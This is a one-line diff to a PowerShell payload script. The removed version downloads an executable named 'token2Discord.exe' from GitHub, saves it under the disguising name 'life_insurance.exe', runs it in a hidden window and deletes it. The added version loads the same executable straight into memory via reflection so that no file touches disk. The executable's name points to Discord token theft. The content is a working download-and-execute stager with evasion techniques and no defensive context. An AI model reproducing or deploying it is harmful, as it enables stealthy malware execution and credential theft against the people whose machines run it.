@@ -1,1 +1,1 @@
-mkdir C:\temp; cd C:\temp; $down = New-Object System.Net.WebClient; $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath C:\temp\life_insurance.exe -WindowStyle Hidden; rm -r C:\temp\life_insurance.exe
+$url = "https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe";$webC = New-Object System.Net.WebClient; $bytie = $webC.DownloadData($url); [System.Reflection.Assembly]::Load($bytie)
